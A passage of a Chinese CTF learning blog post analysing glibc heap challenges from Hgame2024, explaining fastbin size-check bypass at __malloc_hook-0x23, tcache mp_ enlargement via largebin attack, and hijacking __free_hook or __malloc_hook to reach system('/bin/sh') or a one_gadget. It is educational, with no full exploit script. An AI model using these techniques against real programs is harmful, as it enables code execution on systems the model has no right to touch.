+<h5 id="SIZE位检查绕过"><a href="#SIZE位检查绕过" class="headerlink" title="SIZE位检查绕过"></a>SIZE位检查绕过</h5><p>继续看到2.23 从fastbin里malloc时候的源码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="line">   can try it without checking, which saves some time on this fast path.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    if (victim != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            return NULL;</span><br><span class="line">          &#125;//这里要求size位的大小要符合fastbin才能把bin里的东西取出来</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);//其实这一行很有意思，但是这个不用管，所以我放在最后讲（</span><br><span class="line">        void *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>所以我们想要实现的任意地址写继续使用<code>__free_hook</code>就不行了，<code>__free_hook</code>上面都是0，<code>__free_hook</code>之后的地址也没啥好考虑的，因为即使符合条件也没办法覆写<code>__free_hook</code>了。</p>
+<p>而<code>__malloc_hook</code>上面有一段不为空的地方可以利用,一般__malloc_hook-0x23能得到一个0x7f,满足0x20-0x80的要求。<br>所以这个题还是double free混淆一次fd，然后取的时候因为要检查size所以用__malloc_hook改写这样就可以塞进去一个能取出来的地址了。</p>
+<blockquote>
+<p>注意：fastbin的fd记录的是chunk_addr,然而实际数据是从chunk_addr+0x10的地方开始写的，所以取出<code>__malloc_hook-0x23</code>的时候写入数据是从<code>__malloc_hook-0x13</code>的地方开始的。</p>
+</blockquote>
+<h3 id="week3堆题分析"><a href="#week3堆题分析" class="headerlink" title="week3堆题分析"></a>week3堆题分析</h3><p>week3全是堆题（（，所以就是week3分析。</p>
+<h4 id="Elden-Ring-III"><a href="#Elden-Ring-III" class="headerlink" title="Elden Ring III"></a>Elden Ring III</h4><p>largebin_attack，只允许申请大堆块。</p>
+<h5 id="tcache-mp"><a href="#tcache-mp" class="headerlink" title="tcache mp_"></a>tcache mp_</h5><p>感觉还是得先从tcache结构讲起我才能舒服。</p>
+<p>首先我们知道<code>tcachebin</code>能够放64个bin的链表，从0x20+0x10*63&#x3D;0x410<br>所以申请的0x10-0x400的堆块free后会先来这里，否则是<code>unsortedbin</code>。</p>
+<p><code>tcache_perthread_struct</code>是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x250(2.30以前)。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS                64</span><br></pre></td></tr></table></figure></div>
+
+<p>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code><br>也就是调试的时候经常能够看到的第一个大堆块。（具体过程和源码实现可以看看wiki）<br>这个0x250也就是<code>tcache_perthread_struct</code>的大小<code>0x10</code>的头+<code>0x01*0x40</code>的counts+<code>0x08*0x40</code>的entries</p>
+<p>在之后的版本这个chunk的大小为0x290&#x3D;0x250+0x40。多出来的0x40就是因为定义的时候更改了count的类型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS                64</span><br></pre></td></tr></table></figure></div>
+
+<p>而<code>tcache_entry</code>记录的就是bin的单向链表（具体的实现还是要看源码但我觉得这个还是好理解的）</p>
+<p>也就是说之前利用时比较熟悉的fd如果是被<code>tcachebin</code>记录的话实际上位置是了如指掌的，就在heap的开头但是摸不到。</p>
+<p>终于讲到漏洞发生了。<br>有tcache的版本free的时候优先考虑tcache，看到要进入<code>tcache_put</code>的条件是对比 <code>mp_.tcache_bins</code>作检查而非宏定义，这就给了我们操作空间。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></div>
+<p><code>tcache_put</code>的内容之前看过，几乎没有检查的检查。</p>
+<p>现在我们希望摸一下<code>tcachebin</code>就变成一件可能的事，把<code>mp_.tcache_bins </code>变大，那么就能够让超过0x400的chunk来到tcachebin而不是<code>unsortedbin</code>。<br>根据刚刚看到的结构，这个不该挤进来的<code>chunk</code>的fd还会被挤到后面的<code>chunk</code>的内存里。</p>
+<p>这个后面的<code>chunk</code>要是可编辑，那就终于可以实现我们想要的任意地址写了。不过还是得看看这个改完的地址能不能取。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 从 tcache list 中获取内存</span><br><span class="line">if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内</span><br><span class="line">    /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空</span><br><span class="line">  &#123;</span><br><span class="line">    return tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">DIAG_POP_NEEDS_COMMENT;</span><br></pre></td></tr></table></figure></div>
+<p>还是和<code>mp_.tcache_bins</code>作比较，所以改完<code>mp_.tcache_bins</code>后的任意地址写没有什么阻碍和之前一样操作就ok。</p>
+<p>最后，说了这么多，<code>mp_.tcache_bins</code>怎么改？</p>
+<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h5><p>真写不完。。</p>
+<p><em>ㅍ_ㅍ做这道题原理看了好久才理解，然后调试的时候nt了一下搞得我一直以为自己理解错了。。</em></p>
+<h3 id="堆的任意地址写"><a href="#堆的任意地址写" class="headerlink" title="堆的任意地址写"></a>堆的任意地址写</h3><p>想要控制程序做点我们想做的事情，就得把我们精心准备的数据流塞进奇怪的地方（任意地址）。下面是我目前了解的堆里的塞法与利用</p>
+<h4 id="钩子函数："><a href="#钩子函数：" class="headerlink" title="钩子函数："></a>钩子函数：</h4><h5 id="free-hook："><a href="#free-hook：" class="headerlink" title="__free_hook："></a>__free_hook：</h5><p>把__free_hook的指向写入system，再释放一个内容为“&#x2F;bin&#x2F;sh\x00”的chunk,就把“&#x2F;bin&#x2F;sh\x00”传给了system</p>
+<h5 id="malloc-hook："><a href="#malloc-hook：" class="headerlink" title="__malloc_hook："></a>__malloc_hook：</h5><p>malloc接收的是size的时候就已经调用了，所以system（）还需要传参的方式不太适用。可以使用one—gadget。<br>one gadget是有条件的，所以可以借助realloc调整栈帧</p>
+<h5 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook:"></a>__realloc_hook:</h5><p>距离__malloc_hook很近，很近的意思是就在__malloc_hook-0x08的地方<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/21/heap%E5%88%9D%E6%8E%A2/img.png"
+                      alt="img.png"
+                ></p>
+<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one-gadget:"></a>one-gadget:</h4><p><code>one_gadget -f 路径</code></p>
+<h3 id="something-interesting"><a href="#something-interesting" class="headerlink" title="something interesting"></a>something interesting</h3><h4 id="check-remalloced-chunk-A-P-N"><a href="#check-remalloced-chunk-A-P-N" class="headerlink" title="check_remalloced_chunk(A, P, N)"></a>check_remalloced_chunk(A, P, N)</h4><p>在fastbin的源码里有这么一个函数：check_remalloced_chunk(A,P,N)<br>可能是看到check于是DNA动了一下就扒了下源码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">//提取p堆块结构体中存放的size,由于低三位是标志复用,</span><br><span class="line">  if (!chunk_is_mmapped (p))//如果是mmap分配的堆块</span><br><span class="line">      //如果是mmap分配的堆块,则</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));//首先检查给定的av是否是预期的p的所属分配区</span><br><span class="line">      if (chunk_non_main_arena (p))//如果p不是主分配区的</span><br><span class="line">        assert (av != &amp;main_arena);//检查av是不是主分配区</span><br><span class="line">      else</span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);//检查本堆块是否正在使用</span><br><span class="line"></span><br><span class="line">  /* Legal size ... */</span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == 0);//检查sz大小是否对齐</span><br><span class="line">  assert ((unsigned long) (sz) &gt;= MINSIZE);//检查sz大小是否大于最小分配大小</span><br><span class="line">  /* ... and alignment */</span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));//检查p指向的地址是否对齐</span><br><span class="line">  /* chunk is less than MINSIZE more than request */</span><br><span class="line">  assert ((long) (sz) - (long) (s) &gt;= 0);</span><br><span class="line">  assert ((long) (sz) - (long) (s + MINSIZE) &lt; 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>总之该函数主要用来检测chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位。该函数中的if会判断chunk是否为mmap申请，还有是否为main_arena管理等。<br>在fastbin中：主要用来检测你要malloc的这个chunk的PREV_INUSE为是否为1。<br>最严格的是，他会<strong>检查p指针是否对齐</strong>（在64位里是0x10），按照这样的check,__malloc_hook-0x23肯定过不了校验。然而实际上这样能通。</p>
+<p>于是深入研究一下，发现源码实际上是这样的：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   Debugging support</span><br><span class="line"></span><br><span class="line">   These routines make a number of assertions about the states</span><br><span class="line">   of data structures that should be true at all times. If any</span><br><span class="line">   are not true, it&#x27;s very likely that a user program has somehow</span><br><span class="line">   trashed memory. (It&#x27;s also possible that there is a coding error</span><br><span class="line">   in malloc. In which case, please report it!)</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#if !MALLOC_DEBUG</span><br><span class="line"></span><br><span class="line"># define check_chunk(A, P)</span><br><span class="line"># define check_free_chunk(A, P)</span><br><span class="line"># define check_inuse_chunk(A, P)</span><br><span class="line"># define check_remalloced_chunk(A, P, N)</span><br><span class="line"># define check_malloced_chunk(A, P, N)</span><br><span class="line"># define check_malloc_state(A)</span><br><span class="line"></span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line"># define check_chunk(A, P)              do_check_chunk (A, P)</span><br><span class="line"># define check_free_chunk(A, P)         do_check_free_chunk (A, P)</span><br><span class="line"># define check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span><br><span class="line"># define check_remalloced_chunk(A, </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> P, N) do_check_remalloced_chunk (A, P, N)</span><br><span class="line"># define check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span><br><span class="line"># define check_malloc_state(A)         do_check_malloc_state (A)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>真正有函数内容的<code>do_check_malloced_chunk (A, P, N)</code>作为宏定义写在<code>#else</code>之后，而<code>#if</code>后面只是仅仅声明了这些函数。</p>
+<p><code>#if</code>是什么意思呢(*´･д･)?它是C语言中的 _条件编译语法_。</p>
+<blockquote>
+<p>条件编译区域以 #if、#ifdef 或 #ifndef 等命令作为开头，以 #endif 命令结尾。条件编译区域可以有任意数量的 #elif 命令，但最多一个 #else 命令。<br>预处理器会依次计算条件表达式，直到发现结果非 0（也就是 true）的条件表达式。预处理器会保留对应组内的源代码，以供后续处理。如果找不到值为 true 的表达式，并且该条件式编译区域中包含 #else 命令，则保留 #else 命令组内的代码。</p>
+</blockquote>
+<h4 id="double-free"><a href="#double-free" class="headerlink" title="double free?"></a>double free?</h4><p>看到一个很奇怪的东西：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK+qx&amp;alichlgref=https://www.bing.com/#toc-25" >https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK%2Bqx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-25 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在这位师傅的old_fastbin的exp触发malloc的方式是对同一个chunk free两次，触发double free报错。<br>很有意思，记录一下。</p>
+<h3 id="´∀-♥"><a href="#´∀-♥" class="headerlink" title="(*´∀&#96;)~♥"></a>(*´∀&#96;)~♥</h3><p>感谢师傅晚上陪我一起看源码喵。尤其<code>check_remalloced_chunk(A, P, N)</code>的部分确实是帮大忙，看源码对我这种编程语言母语是python的人还是有点费劲的。</p>
+<p>heap初探，over!</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> heap初探 | Hgame2024 week2&amp;week3 堆部分分析</li>
+        <li><strong>Author:</strong> M1aoo0bin</li>
+        <li><strong>Created at
+                :</strong> 2024-06-21 21:35:53</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-06-23 03:57:50
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/06/21/heap初探/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/">#学习日志</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/06/22/Wandering/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Wandering</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2024矩阵杯wp 两级反转</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">heap初探 | Hgame2024 week2&amp;week3 堆部分分析</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E5%A0%86%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%A4%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">对堆的简单认识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week2%E5%A0%86%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">week2堆题分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Elden-Ring-II"><span class="nav-number">2.1.</span> <span class="nav-text">Elden Ring II</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#tcache-poisoning"><span class="nav-number">2.1.1.</span> <span class="nav-text">tcache_poisoning</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastnote"><span class="nav-number">2.2.</span> <span class="nav-text">fastnote</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fastbin-double-free"><span class="nav-number">2.2.1.</span> <span class="nav-text">fastbin double free</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#old-fastnote"><span class="nav-number">2.3.</span> <span class="nav-text">old_fastnote</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SIZE%E4%BD%8D%E6%A3%80%E6%9F%A5%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.1.</span> <span class="nav-text">SIZE位检查绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week3%E5%A0%86%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">week3堆题分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Elden-Ring-III"><span class="nav-number">3.1.</span> <span class="nav-text">Elden Ring III</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#tcache-mp"><span class="nav-number">3.1.1.</span> <span class="nav-text">tcache mp_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#largebin-attack"><span class="nav-number">3.1.2.</span> <span class="nav-text">largebin attack</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">4.</span> <span class="nav-text">堆的任意地址写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">钩子函数：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#free-hook%EF%BC%9A"><span class="nav-number">4.1.1.</span> <span class="nav-text">__free_hook：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-hook%EF%BC%9A"><span class="nav-number">4.1.2.</span> <span class="nav-text">__malloc_hook：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#realloc-hook"><span class="nav-number">4.1.3.</span> <span class="nav-text">__realloc_hook:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#one-gadget"><span class="nav-number">4.2.</span> <span class="nav-text">one-gadget:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#something-interesting"><span class="nav-number">5.</span> <span class="nav-text">something interesting</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#check-remalloced-chunk-A-P-N"><span class="nav-number">5.1.</span> <span class="nav-text">check_remalloced_chunk(A, P, N)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#double-free"><span class="nav-number">5.2.</span> <span class="nav-text">double free?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%C2%B4%E2%88%80-%E2%99%A5"><span class="nav-number">6.</span> <span class="nav-text">(*´∀&#96;)~♥</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">借我酒一杯，慢叙愁百千</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">M1aoo0bin</a>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.3</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
